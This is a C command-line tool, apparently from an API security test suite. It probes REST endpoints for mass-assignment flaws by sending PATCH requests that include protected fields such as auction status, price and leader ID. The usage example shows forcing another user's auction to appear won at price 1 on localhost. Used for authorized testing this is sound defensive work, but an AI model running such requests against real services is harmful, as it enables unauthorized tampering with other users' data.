/*
 * rest_mass_assignment.c -- API3:2023 Broken Object Property Level Authorization
 * (mass assignment)
 *
 * Idea: el atacante envia en el body campos que NO deberia poder modificar
 * (precio_actual, estado, lider_id, vendedor_id...) ademas de los legitimos.
 * En modo vulnerable el servidor hace un bind/merge ciego del JSON a su
 * modelo interno y los acepta; en modo blindado debe ignorarlos (whitelist
 * de campos de entrada).
 *
 * Uso:
 *   ./rest_mass_assignment <url_recurso> <token> <campo_legitimo=valor> \
 *                           <campo_prohibido=valor> [mas campos...]
 *
 * Ejemplo (forzar que una subasta ajena aparezca ya ganada por nosotros):
 *   ./rest_mass_assignment http://localhost:8080/api/v1/subastas/42 "Bearer xxx" \
 *       titulo="Lavadora" estado=CERRADA precio_actual=1 lider_id=mi-usuario-id
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr,
            "Uso: %s <url_recurso> <token> campo=valor [campo=valor ...]\n",
            argv[0]);
        return 1;
    }
    const char *url = argv[1];
    const char *token = argv[2];

    /* arma un JSON plano con los campos recibidos por CLI, incluyendo los
       que no deberian ser modificables por el cliente */
    char body[2048] = "{";
    for (int i = 3; i < argc; i++) {
        char campo[128], valor[256];
        char *eq = strchr(argv[i], '=');
        if (!eq) continue;
        size_t klen = eq - argv[i];
        snprintf(campo, sizeof(campo), "%.*s", (int)klen, argv[i]);
        snprintf(valor, sizeof(valor), "%s", eq + 1);

        /* si el valor es numerico puro, se envia sin comillas; si no, como string */
        int es_numero = 1;
        for (char *p = valor; *p; p++) if (*p < '0' || *p > '9') { es_numero = 0; break; }

        char frag[600];
        if (es_numero && valor[0])
            snprintf(frag, sizeof(frag), "\"%s\":%s", campo, valor);
        else
            snprintf(frag, sizeof(frag), "\"%s\":\"%s\"", campo, valor);

        strncat(body, frag, sizeof(body) - strlen(body) - 2);
        if (i < argc - 1) strncat(body, ",", sizeof(body) - strlen(body) - 1);
    }
    strncat(body, "}", sizeof(body) - strlen(body) - 1);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    buffer_t buf;
    buffer_init(&buf);

    struct curl_slist *headers = NULL;
    char authhdr[512];
    snprintf(authhdr, sizeof(authhdr), "Authorization: %s", token);
    headers = curl_slist_append(headers, authhdr);
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PATCH");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, buffer_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    printf("--> PATCH %s\nbody enviado: %s\n\n", url, body);

    CURLcode res = curl_easy_perform(curl);
    long status = 0;
    if (res == CURLE_OK) curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

    const char *resultado = (status >= 200 && status < 300) ? "VULNERABLE" :
                             (status == 400 || status == 403 || status == 422) ? "bloqueado" : "?";
    log_result("MassAssign/API3", url, status, resultado, buf.data);

    printf("Revisa manualmente la respuesta para confirmar si los campos\n"
           "prohibidos (precio_actual, estado, lider_id, ...) de verdad\n"
           "cambiaron en el estado del servidor, no solo si el HTTP fue 2xx.\n");

    curl_slist_free_all(headers);
    buffer_free(&buf);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
